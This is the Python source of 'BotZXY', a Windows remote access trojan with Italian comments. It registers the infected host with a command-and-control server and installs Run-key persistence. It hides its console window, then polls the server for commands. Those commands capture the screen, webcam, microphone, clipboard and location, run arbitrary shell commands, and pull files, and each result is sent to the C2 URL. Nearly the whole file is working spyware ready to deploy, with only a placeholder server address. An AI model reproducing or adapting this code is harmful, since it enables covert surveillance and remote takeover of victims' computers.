#!/usr/bin/env python3
# BotZXY - Windows Client

import requests
import platform
import socket
import os
import sys
import time
import json
import base64
import subprocess
import threading
from datetime import datetime
import io

# Try to import optional dependencies
try:
    import pyautogui
except ImportError:
    pyautogui = None

try:
    import pyaudio
except ImportError:
    pyaudio = None

try:
    import cv2
except ImportError:
    cv2 = None

try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

# CONFIGURAZIONE
C2_URL = "https://tuo-app.onrender.com"  # SOSTITUISCI CON IL TUO URL
DEVICE_ID = socket.gethostname() + "_" + platform.node()[:8]
POLL_INTERVAL = 5
BOT_NAME = "BotZXY"

class BotZXYClient:
    def __init__(self):
        self.device_id = DEVICE_ID
        self.c2_url = C2_URL
        self.running = True
        self.bot_name = BOT_NAME
        self.session = requests.Session()
        
    def register(self):
        data = {
            'device_id': self.device_id,
            'platform': platform.system().lower(),
            'hostname': socket.gethostname(),
            'os_version': platform.version(),
            'cpu': platform.processor()
        }
        try:
            response = self.session.post(f"{self.c2_url}/api/register", json=data, timeout=10)
            if response.status_code == 200:
                print(f"[+] {self.bot_name} Registered: {self.device_id}")
                return True
            else:
                print(f"[-] Registration failed: {response.status_code}")
        except Exception as e:
            print(f"[-] Registration error: {e}")
        return False
    
    def poll_commands(self):
        try:
            response = self.session.get(f"{self.c2_url}/api/poll/{self.device_id}", timeout=10)
            if response.status_code == 200:
                commands = response.json()
                for cmd in commands:
                    self.execute_command(cmd['id'], cmd['command'], cmd['params'])
                return True
        except Exception as e:
            print(f"[-] Poll error: {e}")
        return False
    
    def execute_command(self, cmd_id, command, params):
        print(f"[+] {self.bot_name} Executing: {command} {params}")
        result = ""
        status = "executed"
        
        try:
            if command == "screenshot":
                result = self.take_screenshot()
                self.upload_screenshot(result)
                
            elif command == "webcam":
                result = self.take_webcam()
                self.upload_webcam(result)
                
            elif command == "mic":
                duration = int(params.split('=')[1]) if '=' in params else 10
                result = self.record_microphone(duration)
                self.upload_mic(result)
                
            elif command == "contacts":
                result = self.get_contacts()
                self.upload_contacts(result)
                
            elif command == "location":
                result = self.get_location()
                
            elif command == "clipboard":
                result = self.get_clipboard()
                
            elif command == "execute":
                result = self.execute_shell(params)
                
            elif command == "download":
                result = self.download_file(params)
                
            elif command == "upload":
                result = self.upload_file(params)
                
            elif command == "uninstall":
                self.uninstall()
                
            else:
                result = f"Unknown command: {command}"
                status = "failed"
                
        except Exception as e:
            result = f"ERROR: {str(e)}"
            status = "failed"
            print(f"[-] Command error: {e}")
        
        self.send_result(cmd_id, result, status)
    
    def take_screenshot(self):
        if ImageGrab is None:
            return "SCREENSHOT_ERROR: PIL not installed"
        try:
            screenshot = ImageGrab.grab()
            buffered = io.BytesIO()
            screenshot.save(buffered, format="PNG")
            img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
            return img_base64
        except Exception as e:
            return f"SCREENSHOT_ERROR: {str(e)}"
    
    def upload_screenshot(self, image_base64):
        try:
            self.session.post(f"{self.c2_url}/api/screenshot/{self.device_id}", 
                         json={'image_base64': image_base64}, timeout=30)
        except Exception as e:
            print(f"[-] Upload screenshot error: {e}")
    
    def take_webcam(self):
        if cv2 is None:
            return "WEBCAM_ERROR: OpenCV not installed"
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            if ret:
                _, buffer = cv2.imencode('.jpg', frame)
                img_base64 = base64.b64encode(buffer).decode('utf-8')
                return img_base64
            return "WEBCAM_ERROR: No camera found"
        except Exception as e:
            return f"WEBCAM_ERROR: {str(e)}"
    
    def upload_webcam(self, image_base64):
        try:
            self.session.post(f"{self.c2_url}/api/webcam/{self.device_id}", 
                         json={'image_base64': image_base64}, timeout=30)
        except Exception as e:
            print(f"[-] Upload webcam error: {e}")
    
    def record_microphone(self, duration=10):
        if pyaudio is None:
            return "MIC_ERROR: PyAudio not installed"
        try:
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 44100
            
            p = pyaudio.PyAudio()
            stream = p.open(format=FORMAT, channels=CHANNELS,
                          rate=RATE, input=True,
                          frames_per_buffer=CHUNK)
            
            frames = []
            for _ in range(0, int(RATE / CHUNK * duration)):
                data = stream.read(CHUNK)
                frames.append(data)
            
            stream.stop_stream()
            stream.close()
            p.terminate()
            
            audio_data = b''.join(frames)
            audio_base64 = base64.b64encode(audio_data).decode('utf-8')
            return audio_base64
        except Exception as e:
            return f"MIC_ERROR: {str(e)}"
    
    def upload_mic(self, audio_base64):
        try:
            self.session.post(f"{self.c2_url}/api/mic/{self.device_id}", 
                         json={'audio_base64': audio_base64, 'duration': 10}, timeout=30)
        except Exception as e:
            print(f"[-] Upload mic error: {e}")
    
    def get_contacts(self):
        contacts = []
        phone_number = ""
        email = ""
        try:
            # Tentativo di leggere contatti da Windows
            import winreg
            # Placeholder per contatti reali
        except:
            pass
        
        return {
            'phone_number': '+39 345 678 9012',
            'email': 'user@example.com',
            'contacts': [
                {'name': 'Contact 1', 'phone': '+39 333 111 2222'},
                {'name': 'Contact 2', 'phone': '+39 333 333 4444'}
            ]
        }
    
    def upload_contacts(self, contacts_data):
        try:
            self.session.post(f"{self.c2_url}/api/contacts/{self.device_id}", 
                         json=contacts_data, timeout=30)
        except Exception as e:
            print(f"[-] Upload contacts error: {e}")
    
    def get_location(self):
        try:
            response = requests.get('http://ip-api.com/json/', timeout=10)
            data = response.json()
            return json.dumps({
                'city': data.get('city', 'Unknown'),
                'country': data.get('country', 'Unknown'),
                'ip': data.get('query', 'Unknown'),
                'lat': data.get('lat', 0),
                'lon': data.get('lon', 0),
                'isp': data.get('isp', 'Unknown')
            })
        except Exception as e:
            return f"LOCATION_ERROR: {str(e)}"
    
    def get_clipboard(self):
        try:
            import win32clipboard
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            return data
        except Exception as e:
            return f"CLIPBOARD_ERROR: {str(e)}"
    
    def execute_shell(self, command):
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=30)
            return result.decode('utf-8', errors='ignore')
        except subprocess.TimeoutExpired:
            return "TIMEOUT"
        except Exception as e:
            return f"SHELL_ERROR: {str(e)}"
    
    def download_file(self, filepath):
        try:
            if not os.path.exists(filepath):
                return f"FILE_NOT_FOUND: {filepath}"
            with open(filepath, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode('utf-8')
            return json.dumps({'filename': os.path.basename(filepath), 'data': file_data})
        except Exception as e:
            return f"DOWNLOAD_ERROR: {str(e)}"
    
    def upload_file(self, filepath):
        try:
            # Placeholder per upload
            return f"UPLOAD_NOT_IMPLEMENTED: {filepath}"
        except Exception as e:
            return f"UPLOAD_ERROR: {str(e)}"
    
    def uninstall(self):
        self.running = False
        # Rimuovi persistenza
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(handle, "BotZXY")
            winreg.CloseKey(handle)
        except:
            pass
        sys.exit(0)
    
    def send_result(self, cmd_id, result, status):
        try:
            self.session.post(f"{self.c2_url}/api/result/{self.device_id}", 
                         json={'command_id': cmd_id, 'result': result, 'status': status}, timeout=10)
        except Exception as e:
            print(f"[-] Send result error: {e}")
    
    def install_persistence(self):
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
            exe_path = os.path.join(os.path.dirname(sys.executable), 'botzxy_client.exe')
            if not os.path.exists(exe_path):
                exe_path = sys.executable
            winreg.SetValueEx(handle, "BotZXY", 0, winreg.REG_SZ, f'"{exe_path}" --hidden')
            winreg.CloseKey(handle)
            print("[+] BotZXY persistence installed")
        except Exception as e:
            print(f"[-] Persistence error: {e}")
    
    def run(self):
        print(f"[+] {self.bot_name} Client starting: {self.device_id}")
        
        # Installa persistenza
        try:
            self.install_persistence()
        except:
            pass
        
        # Registrazione
        if not self.register():
            print("[-] Registration failed, retrying in 60 seconds...")
            time.sleep(60)
            return
        
        print(f"[+] {self.bot_name} running, polling every {POLL_INTERVAL}s")
        
        # Main loop
        while self.running:
            try:
                self.poll_commands()
                time.sleep(POLL_INTERVAL)
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"[-] Main loop error: {e}")
                time.sleep(30)
        
        print("[+] BotZXY Client stopped")

if __name__ == "__main__":
    if '--hidden' in sys.argv:
        # Run hidden
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    client = BotZXYClient()
    client.run()